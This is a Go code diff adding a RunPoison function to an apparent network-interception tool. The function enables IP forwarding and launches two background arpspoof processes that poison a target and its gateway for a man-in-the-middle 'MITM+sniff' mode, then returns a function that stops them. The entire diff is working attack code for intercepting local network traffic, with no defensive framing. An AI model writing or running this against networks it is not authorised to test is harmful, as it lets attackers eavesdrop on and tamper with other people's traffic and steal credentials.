@@ -137,6 +137,36 @@ func disableIPForwarding(_ string) {
 	}
 }
 
+// RunPoison starts ARP poisoning in the background and returns a stop function.
+// Used by netintercept for combined MITM+sniff mode.
+func RunPoison(iface, target, gateway string) (func(), error) {
+	if err := enableIPForwarding(iface); err != nil {
+		// non-fatal — continue even if forwarding fails
+	}
+	cmd1 := exec.Command("arpspoof", "-i", iface, "-t", target, gateway)
+	cmd2 := exec.Command("arpspoof", "-i", iface, "-t", gateway, target)
+	cmd1.Stderr = os.Stderr
+	cmd2.Stderr = os.Stderr
+	if err := cmd1.Start(); err != nil {
+		return nil, fmt.Errorf("arpspoof error: %v", err)
+	}
+	if err := cmd2.Start(); err != nil {
+		cmd1.Process.Kill()
+		return nil, fmt.Errorf("arpspoof error: %v", err)
+	}
+	return func() {
+		if cmd1.Process != nil {
+			cmd1.Process.Signal(syscall.SIGTERM)
+			cmd1.Wait()
+		}
+		if cmd2.Process != nil {
+			cmd2.Process.Signal(syscall.SIGTERM)
+			cmd2.Wait()
+		}
+		disableIPForwarding(iface)
+	}, nil
+}
+
 func init() {
 	// Suppress unused import
 	_ = os.Stderr
